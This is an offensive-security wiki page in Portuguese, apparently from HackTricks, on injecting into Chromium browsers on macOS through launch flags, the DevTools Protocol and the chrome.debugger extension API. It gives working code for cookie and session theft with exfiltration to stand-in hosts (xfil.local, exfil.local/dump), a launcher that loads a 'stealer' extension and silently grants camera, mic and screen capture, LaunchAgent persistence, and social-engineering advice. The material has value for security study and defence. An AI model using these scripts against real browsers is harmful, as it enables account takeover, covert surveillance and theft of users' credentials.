# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Informações básicas

Navegadores baseados no Chromium como Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi e Opera todos utilizam as mesmas opções de linha de comando, arquivos de preferências e interfaces de automação do DevTools. No macOS, qualquer usuário com acesso GUI pode encerrar uma sessão existente do navegador e reabri-la com flags arbitrárias, extensões ou DevTools endpoints que serão executados com os entitlements do alvo.

#### Iniciando o Chromium com flags customizadas no macOS

O macOS mantém uma única instância de UI por perfil Chromium, então a instrumentação normalmente requer forçar o fechamento do navegador (por exemplo com `osascript -e 'tell application "Google Chrome" to quit'`). Atacantes tipicamente relançam via `open -na "Google Chrome" --args <flags>` para injetar argumentos sem modificar o app bundle. Envolver esse comando dentro de um user LaunchAgent (`~/Library/LaunchAgents/*.plist`) ou login hook garante que o navegador manipulado seja respawnado após reboot/logoff.

#### `--load-extension` Flag

A flag `--load-extension` auto-loads unpacked extensions (caminhos separados por vírgula). Combine com `--disable-extensions-except` para bloquear extensões legítimas enquanto força apenas seu payload a ser executado. Extensões maliciosas podem requisitar permissões de alto impacto como `debugger`, `webRequest`, e `cookies` para pivotar para os protocolos DevTools, alterar cabeçalhos CSP, rebaixar HTTPS, ou exfiltrar material de sessão assim que o navegador iniciar.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Esses switches expõem o Chrome DevTools Protocol (CDP) via TCP ou pipe para que ferramentas externas possam controlar o navegador. O Google observou abuso generalizado por infostealers dessa interface e, a partir do Chrome 136 (março de 2025), os switches são ignorados para o perfil padrão a menos que o navegador seja iniciado com um `--user-data-dir` não padrão. Isso aplica App-Bound Encryption em perfis reais, mas atacantes ainda podem spawnar um perfil novo, forçar a vítima a se autenticar dentro dele (phishing/triage assistance), e coletar cookies, tokens, device trust states, ou registros WebAuthn via CDP.

#### `--user-data-dir` Flag

Essa flag redireciona todo o perfil do navegador (History, Cookies, Login Data, Preference files, etc.) para um caminho controlado pelo atacante. É obrigatória ao combinar builds modernas do Chrome com `--remote-debugging-port`, e também mantém o perfil manipulado isolado para que você possa dropar arquivos `Preferences` ou `Secure Preferences` pré-populados que desabilitem prompts de segurança, instalem extensões automaticamente e alterem esquemas padrão.

#### `--use-fake-ui-for-media-stream` Flag

Esse switch contorna o prompt de permissão de câmera/mic para que qualquer página que chame `getUserMedia` receba acesso imediatamente. Combine com flags como `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk`, ou comandos CDP `Browser.grantPermissions` para capturar áudio/vídeo silenciosamente, desk-share, ou satisfazer checagens de permissão WebRTC sem interação do usuário.

## Remote Debugging & DevTools Protocol Abuse

Uma vez que o Chrome é relançado com um `--user-data-dir` dedicado e `--remote-debugging-port`, você pode attachar via CDP (ex.: `chrome-remote-interface`, `puppeteer`, ou `playwright`) e scriptar fluxos de trabalho com altos privilégios:

- **Cookie/session theft:** `Network.getAllCookies` and `Storage.getCookies` retornam valores HttpOnly mesmo quando App-Bound encryption normalmente bloquearia o acesso ao sistema de arquivos, porque o CDP pede ao navegador em execução que os descriptografe.
- **Permission tampering:** `Browser.grantPermissions` e `Emulation.setGeolocationOverride` permitem contornar prompts de câmera/mic (especialmente quando combinados com `--use-fake-ui-for-media-stream`) ou falsificar checagens de segurança baseadas em localização.
- **Keystroke/script injection:** `Runtime.evaluate` executa JavaScript arbitrário dentro da aba ativa, permitindo credential lifting, patching do DOM, ou injeção de persistence beacons que sobrevivem à navegação.
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` e `Fetch.enable` interceptam requests/responses autenticados em tempo real sem tocar artefatos no disco.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Porque o Chrome 136 bloqueia o CDP no perfil padrão, copiar/colar o diretório existente da vítima `~/Library/Application Support/Google/Chrome` para um caminho de staging não produz mais cookies descriptografados. Em vez disso, social-engineer o usuário para autenticar dentro do perfil instrumentado (por exemplo, uma sessão de suporte "útil") ou capture MFA tokens em trânsito via CDP-controlled network hooks.

## Injeção baseada em extensão via Debugger API

A pesquisa de 2023 "Chrowned by an Extension" demonstrou que uma extensão maliciosa usando a API `chrome.debugger` pode anexar-se a qualquer aba e obter os mesmos poderes do DevTools que `--remote-debugging-port`. Isso quebra as suposições originais de isolamento (extensões permanecem em seu contexto) e possibilita:

- Roubo silencioso de cookies e credenciais com `Network.getAllCookies`/`Fetch.getResponseBody`.
- Modificação de permissões de site (câmera, microfone, geolocalização) e bypass de intersticiais de segurança, permitindo que páginas de phishing personifiquem diálogos do Chrome.
- Manipulação on-path de avisos TLS, downloads ou prompts WebAuthn ao controlar programaticamente `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior`, ou `Security.handleCertificateError`.

Carregue a extensão com `--load-extension`/`--disable-extensions-except` para que nenhuma interação do usuário seja necessária. Um script de background mínimo que arma a API parece com isto:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
A extensão também pode subscrever eventos `Debugger.paused` para ler variáveis JavaScript, aplicar patches em scripts inline ou inserir breakpoints personalizados que sobrevivem à navegação. Como tudo é executado dentro da sessão da interface gráfica do usuário, Gatekeeper e TCC não são acionados, tornando essa técnica ideal para malware que já conseguiu execução no contexto do usuário.

### Ferramentas

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatiza o lançamento do Chromium com payload extensions e expõe CDP hooks interativos.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Ferramenta similar focada em interceptação de tráfego e instrumentação do navegador para operadores macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Biblioteca Node.js para automatizar dumps do Chrome DevTools Protocol (cookies, DOM, permissions) assim que uma instância com `--remote-debugging-port` estiver ativa.

### Exemplo
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Encontre mais exemplos nos links das ferramentas.

## Referências

- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
